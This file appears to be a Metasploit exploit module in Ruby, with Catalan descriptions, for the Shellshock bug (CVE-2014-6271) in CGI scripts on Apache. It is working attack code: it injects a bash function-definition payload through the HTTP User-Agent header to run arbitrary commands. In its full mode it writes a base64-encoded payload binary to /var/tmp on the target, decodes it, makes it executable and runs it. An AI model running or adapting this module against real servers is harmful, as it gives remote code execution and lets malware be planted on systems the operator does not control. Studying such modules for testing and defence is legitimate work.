
require 'msf/core'
require 'base64'

class Metasploit4 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  #include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Shellshock que aprofita vulnerabilitats en el mod_cgi de una terminal remota',
      'Description' => %q{
        Aquest modul aprofita les vulnerabilitats en el mod_cgi per a poder injectar codi
        remot i aixi adquirir el control de una maquina remota
      },
      'Author' => [
        'Josep Escriva' 
      ],
      'References' => [
        ['CVE', '2014-6271'],
        ['URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6271'],
      ],
      'Payload'        =>
        {
          'DisableNops' => true,
		  'BadChars'	=> "\x00\x0a\x0d",
          'Space'       => 2048
        },
      'Targets'        =>
        [
          [ 'Linux x86',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86
            }
          ],
          [ 'Linux x86_64',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86_64
            }
          ]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Sep 24 2014',
      'License' => MSF_LICENSE
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'ruta a la vulnerabilitat CGI']),
      OptEnum.new('METHOD', [true, 'metode http a emprar', 'GET', ['GET', 'POST']]),
      OptString.new('RPATH', [true, 'Ruta als binaris emprada per CmdStager', '/bin']),
	  OptString.new('COMMAND', [true, 'injeccio de commandaments per Bash', 'ls -la']),
	  OptString.new('FULL', [false, 'Llançament de processos', 'false']),
	  OptString.new('NAMESHELLBIN', [false, 'Nom de la Shell', 'poc']),
      OptInt.new('TIMEOUT', [true, 'HTTP Timeout (segons)', 5])
    ], self.class)
  end


  def request(command)
	print_status "Command: #{command}"
	r = send_request_cgi(
      {
        'method' => datastore['METHOD'],
        'uri' => datastore['TARGETURI'],
        'agent' => "() { :; }; echo; #{command} "
      }, datastore['TIMEOUT'])
	  return r
  end
  
  def check
	#print_status target_uri.path.to_s
	r = request("echo peticio")
	  
	  if r.body.include?("vulnerable")
		Exploit::CheckCode::Vulnerable
	  else
		Exploit::CheckCode::Safe
	  end

  end

  def exploit
  
  if datastore['FULL'] == "true"
  #Complete execution shellcode
	#puts payload.methods
  
	pay = payload.encoded_exe
	print_status "Payload: #{datastore['PAYLOAD']}"
	print_status "Length: #{pay.length.to_s}"
	enc = Base64.encode64(pay).chomp
	enc.gsub!("\n","")
	print_status enc 

	r = request("/bin/echo #{enc} > /var/tmp/#{datastore['NAMESHELLBIN']}")
	
	r = request("/usr/bin/base64 -d /var/tmp/#{datastore['NAMESHELLBIN']} > /var/tmp/#{datastore['NAMESHELLBIN']}_bin")
	
	r = request("/bin/chmod 755 /var/tmp/#{datastore['NAMESHELLBIN']}_bin")
	
	r = request("/var/tmp/#{datastore['NAMESHELLBIN']}_bin")
	
  #Command execution	
  else
	 r = request("#{datastore['RPATH']}/#{datastore['COMMAND']}")
	
	 begin
		print_status r.body
     rescue
		print_status "body empty"
	 end
  end
	 
	
  end

end

